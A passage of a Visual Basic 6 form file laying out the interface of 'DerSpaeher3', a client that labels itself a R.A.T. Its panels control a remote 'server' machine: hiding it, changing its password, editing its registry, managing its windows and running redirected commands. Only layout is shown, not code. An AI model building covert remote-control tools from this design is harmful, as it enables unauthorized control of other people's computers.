            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   360
         Index           =   6
         Left            =   120
         TabIndex        =   213
         Top             =   720
         Width           =   6615
      End
      Begin VB.Label lblSO 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "change the password"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   270
         Index           =   4
         Left            =   0
         TabIndex        =   212
         Top             =   2400
         Width           =   6900
      End
      Begin VB.Label lblSO 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "remove server"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   270
         Index           =   2
         Left            =   0
         TabIndex        =   70
         Top             =   3600
         Width           =   6900
      End
      Begin VB.Label lblSO 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "close server"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   270
         Index           =   3
         Left            =   0
         TabIndex        =   69
         Top             =   3000
         Width           =   6900
      End
      Begin VB.Label lblSO 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "server invisible"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   270
         Index           =   1
         Left            =   0
         TabIndex        =   68
         Top             =   1200
         Width           =   6900
      End
      Begin VB.Label lblSO 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "server visible"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   270
         Index           =   0
         Left            =   120
         TabIndex        =   67
         Top             =   1800
         Width           =   6900
      End
      Begin VB.Label lblClientServerOptionen 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "CLIENT: SERVER OPTIONS"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   600
         TabIndex        =   66
         Top             =   0
         Width           =   5625
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   4
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   27
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   244
      Top             =   480
      Width           =   6975
      Begin VB.Timer Timer3 
         Interval        =   500
         Left            =   6360
         Top             =   4320
      End
      Begin VB.Label Label25 
         AutoSize        =   -1  'True
         BackColor       =   &H80000008&
         Caption         =   "----------=°-°=----------"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   330
         Index           =   4
         Left            =   1320
         TabIndex        =   401
         Top             =   840
         Width           =   4125
      End
      Begin VB.Label Label45 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "----R.A.T.----"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   36
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00808000&
         Height          =   810
         Left            =   330
         TabIndex        =   403
         Top             =   2400
         Width           =   6105
      End
      Begin VB.Label Label44 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Hey...Yeah this is the final version"
         ForeColor       =   &H00808000&
         Height          =   210
         Left            =   1440
         TabIndex        =   402
         Top             =   2040
         Width           =   3975
         WordWrap        =   -1  'True
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00808000&
         X1              =   0
         X2              =   6960
         Y1              =   4080
         Y2              =   4080
      End
      Begin VB.Label Label25 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Welcome to DerSpaeher3"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   20.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   465
         Index           =   0
         Left            =   720
         TabIndex        =   245
         Top             =   0
         Width           =   5280
      End
      Begin VB.Label Label25 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "official DS3 Site: http://derspaeher.cjb.net"
         ForeColor       =   &H00808000&
         Height          =   210
         Index           =   1
         Left            =   1065
         TabIndex        =   246
         Top             =   480
         Width           =   4635
      End
      Begin VB.Shape Shape2 
         BackColor       =   &H00404000&
         BorderColor     =   &H00404000&
         BorderWidth     =   2
         Height          =   2175
         Left            =   240
         Top             =   990
         Width           =   6375
      End
      Begin VB.Image Image8 
         Height          =   1080
         Left            =   1920
         Picture         =   "ds3English!.frx":3496
         Top             =   960
         Width           =   2955
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4095
      Index           =   22
      Left            =   2760
      ScaleHeight     =   4065
      ScaleWidth      =   6945
      TabIndex        =   277
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lbloben 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "CHANGE RESOLUTION"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Index           =   1
         Left            =   1290
         TabIndex        =   283
         Top             =   0
         Width           =   4365
      End
      Begin VB.Label lblAufl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         Caption         =   "800 x 600"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   1
         Left            =   45
         TabIndex        =   282
         Top             =   1560
         Width           =   6855
      End
      Begin VB.Label lblAufl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         Caption         =   "640 x 480"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   0
         Left            =   45
         TabIndex        =   281
         Top             =   960
         Width           =   6855
      End
      Begin VB.Label lblAufl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         Caption         =   "1024 x 768"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   2
         Left            =   45
         TabIndex        =   280
         Top             =   2160
         Width           =   6855
      End
      Begin VB.Label lblAufl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         Caption         =   "1280 x 1024"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   3
         Left            =   45
         TabIndex        =   279
         Top             =   2760
         Width           =   6855
      End
      Begin VB.Label lblAufl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         Caption         =   "1600 x 1200"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   4
         Left            =   0
         TabIndex        =   278
         Top             =   3360
         Width           =   6855
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   30
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   9
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   117
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.ListBox List5 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFFF&
         Height          =   870
         ItemData        =   "ds3English!.frx":5B8E
         Left            =   120
         List            =   "ds3English!.frx":5BA4
         TabIndex        =   356
         Top             =   720
         Width           =   3255
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   255
         Index           =   17
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   127
         Top             =   3720
         Width           =   6675
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   16
         Left            =   120
         TabIndex        =   123
         Top             =   2760
         Width           =   3255
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   15
         Left            =   120
         TabIndex        =   120
         Text            =   "version"
         Top             =   2280
         Width           =   3255
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   14
         Left            =   120
         TabIndex        =   119
         Text            =   "SOFTWARE\Microsoft\Windows\CurrentVersion"
         Top             =   1800
         Width           =   3255
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "set"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   12
         Left            =   3720
         TabIndex        =   126
         Top             =   3255
         Width           =   1695
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "get"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   11
         Left            =   1080
         TabIndex        =   125
         Top             =   3255
         Width           =   1695
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "data (only when you set the registry)"
         ForeColor       =   &H00C0C000&
         Height          =   420
         Index           =   19
         Left            =   3480
         TabIndex        =   124
         Top             =   2640
         Width           =   3375
         WordWrap        =   -1  'True
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "reg-key"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   18
         Left            =   3480
         TabIndex        =   122
         Top             =   1800
         Width           =   735
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "value"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   17
         Left            =   3480
         TabIndex        =   121
         Top             =   2280
         Width           =   525
      End
      Begin VB.Label lbloben 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "REGISTRY"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Index           =   3
         Left            =   2445
         TabIndex        =   118
         Top             =   0
         Width           =   2055
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   11
         Left            =   960
         Shape           =   2  'Oval
         Top             =   3240
         Width           =   1935
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   12
         Left            =   3600
         Shape           =   2  'Oval
         Top             =   3240
         Width           =   1935
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   10
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   8
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   113
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.ListBox List2 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C000&
         Height          =   3180
         Left            =   120
         TabIndex        =   115
         Top             =   720
         Width           =   3855
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "minimize"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   43
         Left            =   4200
         TabIndex        =   399
         Top             =   2775
         Width           =   2415
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "maximize"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   42
         Left            =   4200
         TabIndex        =   398
         Top             =   2295
         Width           =   2415
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "hide"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   41
         Left            =   4200
         TabIndex        =   397
         Top             =   1815
         Width           =   2415
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "bring to top"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   35
         Left            =   4200
         TabIndex        =   343
         Top             =   1335
         Width           =   2415
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "refresh"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   21
         Left            =   4200
         TabIndex        =   188
         Top             =   3255
         Width           =   2415
      End
      Begin VB.Label Label6 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "WINDOWS MANAGER"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1560
         TabIndex        =   114
         Top             =   0
         Width           =   3855
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "close window"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   10
         Left            =   4200
         TabIndex        =   116
         Top             =   840
         Width           =   2415
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   285
         Index           =   10
         Left            =   4080
         Shape           =   2  'Oval
         Top             =   825
         Width           =   2655
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   285
         Index           =   21
         Left            =   4080
         Shape           =   2  'Oval
         Top             =   3240
         Width           =   2655
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   285
         Index           =   35
         Left            =   4080
         Shape           =   2  'Oval
         Top             =   1320
         Width           =   2655
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   285
         Index           =   42
         Left            =   4080
         Shape           =   2  'Oval
         Top             =   2280
         Width           =   2655
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   285
         Index           =   41
         Left            =   4080
         Shape           =   2  'Oval
         Top             =   1800
         Width           =   2655
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   285
         Index           =   43
         Left            =   4080
         Shape           =   2  'Oval
         Top             =   2760
         Width           =   2655
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   9
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   24
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   194
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFC0&
         Height          =   300
         Index           =   22
         Left            =   360
         TabIndex        =   202
         Top             =   2400
         Width           =   2295
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFC0&
         Height          =   300
         Index           =   21
         Left            =   360
         TabIndex        =   200
         Top             =   1920
         Width           =   2295
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFC0&
         Height          =   300
         Index           =   20
         Left            =   360
         Locked          =   -1  'True
         TabIndex        =   198
         Top             =   1440
         Width           =   2295
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFC0&
         Height          =   300
         Index           =   19
         Left            =   360
         Locked          =   -1  'True
         TabIndex        =   195
         Top             =   960
         Width           =   2295
      End
      Begin VB.Label lblDatumZeit 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "change date"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   3
         Left            =   2880
         TabIndex        =   203
         Top             =   2400
         Width           =   1155
      End
      Begin VB.Label lblDatumZeit 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "change time"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   2
         Left            =   2880
         TabIndex        =   201
         Top             =   1920
         Width           =   1155
      End
      Begin VB.Label lblDatumZeit 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "get current date"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   1
         Left            =   2880
         TabIndex        =   199
         Top             =   1440
         Width           =   1680
      End
      Begin VB.Label lblDatumZeit 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "get current time"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   0
         Left            =   2880
         TabIndex        =   197
         Top             =   960
         Width           =   1680
      End
      Begin VB.Label Label22 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Date/Time"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2310
         TabIndex        =   196
         Top             =   0
         Width           =   2325
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   26
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   36
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   352
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox Text4 
         Appearance      =   0  'Flat
         BackColor       =   &H00404000&
         ForeColor       =   &H00FFFFFF&
         Height          =   2775
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   354
         Top             =   720
         Width           =   6735
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "back"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   37
         Left            =   240
         TabIndex        =   355
         Top             =   3615
         Width           =   1185
      End
      Begin VB.Label Label39 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "NETSTAT"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2565
         TabIndex        =   353
         Top             =   0
         Width           =   1815
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   37
         Left            =   120
         Shape           =   2  'Oval
         Top             =   3600
         Width           =   1455
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   37
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   35
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   345
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFFF&
         Height          =   315
         Index           =   38
         Left            =   240
         TabIndex        =   347
         Text            =   "c:\windows\netstat.exe -a"
         Top             =   1080
         Width           =   6495
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00000000&
         Height          =   1635
         Index           =   37
         Left            =   240
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   346
         Top             =   1800
         Width           =   6495
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yeah"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   36
         Left            =   360
         TabIndex        =   351
         Top             =   3600
         Width           =   2025
      End
      Begin VB.Label Label38 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "APP REDIRECT"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1935
         TabIndex        =   350
         Top             =   0
         Width           =   3075
      End
      Begin VB.Label Label36 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "command (type full path):"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   5
         Left            =   240
         TabIndex        =   349
         Top             =   840
         Width           =   2625
      End
      Begin VB.Label Label36 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "ouput:"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   3
         Left            =   240
         TabIndex        =   348
         Top             =   1560
         Width           =   630
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   36
         Left            =   240
         Shape           =   2  'Oval
         Top             =   3580
         Width           =   2295
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3315
         Index           =   36
         Left            =   0
         Top             =   720
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   10
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   128
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblGemein 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "clear clipboard"
         BeginProperty Font 
